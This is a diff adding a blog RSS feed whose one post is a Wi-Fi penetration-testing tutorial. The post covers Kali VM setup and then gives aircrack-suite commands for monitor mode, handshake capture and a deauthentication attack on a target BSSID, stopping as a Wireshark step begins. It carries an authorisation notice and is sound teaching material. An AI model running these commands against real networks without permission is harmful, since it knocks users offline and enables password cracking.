@@ -1,0 +1,707 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Security on Unveiling the myths of IT</title><link>https://yegormi.github.io/categories/security/</link><description>Recent content in Security on Unveiling the myths of IT</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 30 Sep 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://yegormi.github.io/categories/security/index.xml" rel="self" type="application/rss+xml"/><item><title>Why most Wi-Fi networks are insecure</title><link>https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/</link><pubDate>Mon, 30 Sep 2024 00:00:00 +0000</pubDate><guid>https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/</guid><description>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/header.jpg" alt="Featured image of post Why most Wi-Fi networks are insecure" />&lt;h2 id="introduction">Introduction
+&lt;/h2>&lt;p>In our interconnected society Wi Fi networks are everywhere offering easy internet access at home, workplaces and public areas. Yet many people don&amp;rsquo;t realize the security risks that come with it easily exploitable, with tools. This piece dives into a Wi Fi vulnerability testing procedure to show how vulnerable most networks are emphasizing the importance of beefed up security measures.&lt;/p>
+&lt;h2 id="setting-up-the-environment">Setting up the environment
+&lt;/h2>&lt;p>Before delving into examining Wi Fi vulnerabilities in detail it is important to create a testing environment for penetration tests. Utilizing a machine (VM ) is the recommended and most secure approach for deploying Kali Linux, a widely used distribution, for penetration testing purposes.&lt;/p>
+&lt;h3 id="1-installation-of-kali-linux">1. Installation of Kali Linux
+&lt;/h3>&lt;p>Download the latest VM image from the official download page, which is compatible with your virtualization software: &lt;a class="link" href="https://www.kali.org/get-kali/" target="_blank" rel="noopener"
+>Kali Linux website&lt;/a>. The Kali Linux already provides pre-made VM images for:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>VMware&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>VirtualBox&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>Select the appropriate one for your virtualization platform.&lt;/p>
+&lt;h3 id="2-software-installation">2. Software installation
+&lt;/h3>&lt;p>If not yet installed, download and install one of the following virtualization softwares:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>&lt;a class="link" href="https://www.vmware.com/products/workstation-player.html" target="_blank" rel="noopener"
+>VMware Workstation Player&lt;/a>&lt;/strong> (Free for personal use)&lt;/li>
+&lt;li>&lt;strong>&lt;a class="link" href="https://www.virtualbox.org/" target="_blank" rel="noopener"
+>Oracle VM VirtualBox&lt;/a>&lt;/strong> (Free to use and open-source)&lt;/li>
+&lt;/ul>
+&lt;h3 id="3-setting-up-the-vm">3. Setting up the VM
+&lt;/h3>&lt;h4 id="for-vmware-users">For VMware Users
+&lt;/h4>&lt;ol>
+&lt;li>&lt;strong>Import the VM Image:&lt;/strong>
+&lt;ul>
+&lt;li>Run VMware Workstation Player.&lt;/li>
+&lt;li>Choose the downloaded file in Open under File.&lt;/li>
+&lt;li>Follow everything on the screen to import the VM.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-1.png"
+width="1504"
+height="1290"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-1_hu17214482242665049184.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-1_hu9833357414133138650.png 1024w"
+loading="lazy"
+alt="Initial screen when VMWare is launched"
+class="gallery-image"
+data-flex-grow="116"
+data-flex-basis="279px"
+>&lt;/p>
+&lt;ol start="2">
+&lt;li>&lt;strong>Configure VM Settings (Optional):&lt;/strong>
+&lt;ul>
+&lt;li>Customize memory and CPU options according to your system&amp;rsquo;s capabilities.&lt;/li>
+&lt;li>Make sure that the network adapter corresponds to your needs either &lt;strong>Bridged&lt;/strong> or &lt;strong>NAT&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-2.png"
+width="1504"
+height="1290"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-2_hu5363327194474366268.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-2_hu15272464421394711467.png 1024w"
+loading="lazy"
+alt="Configure VM up to your preferences"
+class="gallery-image"
+data-flex-grow="116"
+data-flex-basis="279px"
+>&lt;/p>
+&lt;h4 id="for-virtualbox-users">For VirtualBox Users
+&lt;/h4>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Import the VM Image:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Open VirtualBox.&lt;/li>
+&lt;li>Choose File then Import to choose the .ova file you have downloaded.&lt;/li>
+&lt;li>Complete the instructions to add the VM.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Configure VM Settings (Optional):&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Right-click on the Kali VM and select &lt;strong>Settings&lt;/strong>.&lt;/li>
+&lt;li>Tweak System settings regarding memory and processors.&lt;/li>
+&lt;li>Make sure that the network adapter corresponds to your needs either &lt;strong>Bridged&lt;/strong> or &lt;strong>NAT&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="4-kali-linux-installation">4. Kali Linux Installation
+&lt;/h3>&lt;p>Once the VM is set up, you need to go through the installation process of Kali Linux. To do this,&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Power on the VM by selecting it and hitting the &lt;strong>Start&lt;/strong> button.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>You&amp;rsquo;ll see the Kali Linux boot menu. Choose &amp;ldquo;Graphical Install&amp;rdquo; or &amp;ldquo;Install&amp;rdquo;, whichever your preference is.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Proceed with the installation by going through each step in TUI:&lt;/p>
+&lt;ul>
+&lt;li>Select Language, Location and Keyboard layout.&lt;/li>
+&lt;li>Configure the network: usually this is set for default&lt;/li>
+&lt;li>Configure users and password: remember to insert a good password&lt;/li>
+&lt;li>Partition disk: usually you can select Guided - use entire disk and set up LVM&lt;/li>
+&lt;li>Install base system and additional packages.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-3.png"
+width="2272"
+height="1836"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-3_hu10420921765024723975.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-3_hu11310561816179519152.png 1024w"
+loading="lazy"
+alt="Installation processs"
+class="gallery-image"
+data-flex-grow="123"
+data-flex-basis="296px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Once the installation is complete, the system will ask you to reboot it.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-4.png"
+width="2184"
+height="1748"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-4_hu5689929523935841098.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-4_hu7897505679553226658.png 1024w"
+loading="lazy"
+alt="Just tap continue to reboot"
+class="gallery-image"
+data-flex-grow="124"
+data-flex-basis="299px"
+>&lt;/p>
+&lt;h3 id="5-launching-kali-linux">5. Launching Kali Linux
+&lt;/h3>&lt;ul>
+&lt;li>When the machine reboots, you will be greeted by the Kali Linux login screen.&lt;/li>
+&lt;li>Log in with your username and password given during installation.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-5.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-5_hu15404722151166048964.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-5_hu17829648685512859959.png 1024w"
+loading="lazy"
+alt="Log in with credentials"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>If you haven&amp;rsquo;t changed the default credentials during installation, then these will be:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Username:&lt;/strong> &lt;code>kali&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Password:&lt;/strong> &lt;code>kali&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>You are strongly advised to alter this default password during first usage of Kali Linux:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h3 id="6-updating-kali-linux">6. Updating Kali Linux
+&lt;/h3>&lt;p>Ensure your Kali Linux instance is up to date:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt update &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> sudo apt full-upgrade -y
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="7-configuring-external-wi-fi-adapter">7. Configuring external Wi-Fi adapter
+&lt;/h3>&lt;p>For effective wireless penetration testing, an external Wi-Fi adapter that supports monitor mode and packet injection is necessary.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Connect the Wi-Fi Adapter:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Plug the adapter into your computer.&lt;/li>
+&lt;li>I will be using the USB-C to USB-A to use one of my Wi-Fi adapters is based on Ralink RT5370&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-1.jpeg"
+width="1280"
+height="960"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-1_hu428951483295719716.jpeg 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-1_hu6933423474358102067.jpeg 1024w"
+loading="lazy"
+alt="Setup with Macbook Pro 16 2021."
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>
+&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-2.jpeg"
+width="960"
+height="1280"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-2_hu13160709169778743488.jpeg 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/setup-2_hu6073102148572241110.jpeg 1024w"
+loading="lazy"
+alt="Ralink RT5370"
+class="gallery-image"
+data-flex-grow="75"
+data-flex-basis="180px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Attach the Adapter to the VM:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>For VMware:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Every time any USB gets connected you will get a pop-up saying whether you want to leave with Parent PC or pass it down to VM&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-6.png"
+width="2566"
+height="1674"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-6_hu1417208922971698697.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-6_hu15905473967214132682.png 1024w"
+loading="lazy"
+alt="In our case, choose &amp;ldquo;Connect to Linux&amp;rdquo;"
+class="gallery-image"
+data-flex-grow="153"
+data-flex-basis="367px"
+>&lt;/p>
+&lt;p>OR&lt;/p>
+&lt;ul>
+&lt;li>Go to &lt;strong>Virtual Machine&lt;/strong> &amp;gt; &lt;strong>USB&lt;/strong> &amp;gt; &lt;strong>Connect &amp;ldquo;Name of you device&amp;rdquo;&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-7.png"
+width="1896"
+height="1568"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-7_hu2558111169429166473.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-7_hu5009274314424409601.png 1024w"
+loading="lazy"
+alt="Virtual Machine -&amp;gt; USB -&amp;gt; Connect &amp;ldquo;Name of you device&amp;rdquo;"
+class="gallery-image"
+data-flex-grow="120"
+data-flex-basis="290px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>For VirtualBox:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Go to &lt;strong>Devices&lt;/strong> &amp;gt; &lt;strong>USB&lt;/strong> &amp;gt; Select your Wi-Fi adapter.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Verify the Adapter in Kali:&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">iwconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-8.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-8_hu1794738750945357860.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-8_hu9705603725556688779.png 1024w"
+loading="lazy"
+alt="Check for an interface similar to &amp;ldquo;wlan0&amp;rdquo;"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="8-testing-the-setup">8. Testing the Setup
+&lt;/h3>&lt;p>Confirm that your Wi-Fi adapter can enter monitor mode:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-9.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-9_hu1383302674903540135.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-9_hu7964125706822777899.png 1024w"
+loading="lazy"
+alt="As we can see something prevents us from entering monitor mode on our Wi-Fi"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;p>Once the Kali Linux VM is established we can go straight to penetration testing and get around the issue listed above&lt;/p>
+&lt;h2 id="understanding-wi-fi-vulnerabilities">Understanding Wi-Fi vulnerabilities
+&lt;/h2>&lt;p>Older security protocols in Wi-Fi networks make them vulnerable to diverse attacks. Hackers can steal the data and enter areas they are not allowed to reach. The steps involved in a conventional Wi-Fi penetration testing scenario will be explained in this analysis to reveal these vulnerabilities.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>⚠️ IMPORTANT ETHICAL AND LEGAL NOTICE ⚠️&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>It is important to point out that such password cracking should be carried out on networks one owns or is explicitly authorized to do some testing of. Cracking passwords on other people&amp;rsquo;s networks is considered illegal and totally unethical.&lt;/strong>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="wi-fi-penetration-testing-process">Wi-Fi penetration testing process
+&lt;/h2>&lt;h3 id="1-checking-network-interfaces">1. Checking network interfaces
+&lt;/h3>&lt;p>Begin by collecting information regarding your system interfaces and networks first.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># See version of Kali Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /etc/os-release
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-10.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-10_hu12403166022881028388.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-10_hu54680655374730690.png 1024w"
+loading="lazy"
+alt="My current version of Kali Linux"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># List network interfaces&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ip addr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iwconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-11.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-11_hu7932517888052363462.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-11_hu12469367884055419330.png 1024w"
+loading="lazy"
+alt="Internet interfaces"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;p>As we can already see the name from &lt;code>wlan0&lt;/code> has been changed to &lt;code>wlan0mon&lt;/code> indicating that the adapter is in monitor mode right now&lt;/p>
+&lt;p>The tools for performing penetration tests are included in Kali Linux from the start.&lt;/p>
+&lt;h3 id="2-killing-conflicting-processes">2. Killing conflicting processes
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo airmon-ng check &lt;span class="nb">kill&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Turning off network related services solves problems related to setting up monitor mode needed for packet capture.&lt;/p>
+&lt;h3 id="3-enabling-monitor-mode">3. Enabling Monitor Mode
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo airmon-ng start wlan0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Switch the wireless interface to monitor mode, if it didn&amp;rsquo;t happen in previous steps to start captureing traffic.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Verify monitor mode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo airmon-ng
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iwconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-12.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-12_hu430927218304805583.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-12_hu341691186495280105.png 1024w"
+loading="lazy"
+alt="We can already see that the adapter is in monitor mode and is ready to be used with airmon-ng tool"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;h3 id="4-scanning-for-access-points">4. Scanning for Access Points
+&lt;/h3>&lt;p>Search for nearby Wi-Fi access points to find our final target.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo airodump-ng wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-13.png"
+width="3662"
+height="2382"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-13_hu2935775736471737627.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-13_hu14575334830217674412.png 1024w"
+loading="lazy"
+alt="Pay attention to a specific network to gather the details required for assessing further steps."
+class="gallery-image"
+data-flex-grow="153"
+data-flex-basis="368px"
+>&lt;/p>
+&lt;p>The tool &lt;code>airodump-ng&lt;/code> shares complete information regarding accessible networks including channels and BSSIDs.&lt;/p>
+&lt;h3 id="5-capturing-handshake-data">5. Capturing Handshake Data
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Start capturing packets on the target network&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo airodump-ng -w dump -c &lt;span class="o">[&lt;/span>channel&lt;span class="o">]&lt;/span> --bssid &lt;span class="o">[&lt;/span>BSSID&lt;span class="o">]&lt;/span> wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-14.png"
+width="3662"
+height="2382"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-14_hu9276788394629509218.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-14_hu17290370422062808061.png 1024w"
+loading="lazy"
+alt="As indicated inside of the red rectangle - network is not empty and clients are connected and transmitting packets"
+class="gallery-image"
+data-flex-grow="153"
+data-flex-basis="368px"
+>&lt;/p>
+&lt;p>Replace &lt;code>[channel]&lt;/code> and &lt;code>[BSSID]&lt;/code> with the information of your target network. The handshake occurs when any device connects to your network. Capturing this is your chance to try and test the password of the network offline.&lt;/p>
+&lt;h3 id="6-launch-a-deauthentication-attack">6. Launch a deauthentication attack
+&lt;/h3>&lt;p>Force devices to reconnect to the network, thereby increasing the probability of capturing handshake data.&lt;/p>
+&lt;p>Create another window of Terminal application and place it to the side of already running command done by the previous step&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo aireplay-ng --deauth &lt;span class="m">0&lt;/span> -a &lt;span class="o">[&lt;/span>BSSID&lt;span class="o">]&lt;/span> wlan0mon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Replace &lt;code>BSSID&lt;/code> by your own. Deauthentication attacks prevent users from using the connections by making all connected devices re-authenticate so that the process can be intercepted.&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-15.png"
+width="3226"
+height="2186"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-15_hu1869897530345261817.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-15_hu11644000135749629526.png 1024w"
+loading="lazy"
+alt="Started sending deauthentication attack"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="354px"
+>&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-16.png"
+width="3226"
+height="2186"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-16_hu10329597615720187784.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-16_hu401750471348987325.png 1024w"
+loading="lazy"
+alt="Having recieved EAPOL meaning the client has made a handshake and has been succefully connected to our network"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="354px"
+>&lt;/p>
+&lt;p>&lt;img src="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-17.png"
+width="2784"
+height="1900"
+srcset="https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-17_hu13587203543808877341.png 480w, https://yegormi.github.io/post/why-most-wi-fi-networks-are-insecure/img/vmware-screen-17_hu197724947621675297.png 1024w"
+loading="lazy"
+alt="Our generated files"
+class="gallery-image"
+data-flex-grow="146"
+data-flex-basis="351px"
+>&lt;/p>
+&lt;p>So now we can procceed to step 7 to precisely look for EAPOL handshake and extract it to pass less data to converter or just skip it, as we already know the dump already contains needed data&lt;/p>
+&lt;h3 id="7-captured-data-analysis-using-wireshark-optional">7. Captured data analysis using Wireshark (optional)
+&lt;/h3>&lt;p>Look for captured packets and confirm that a successful handshake was captured.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
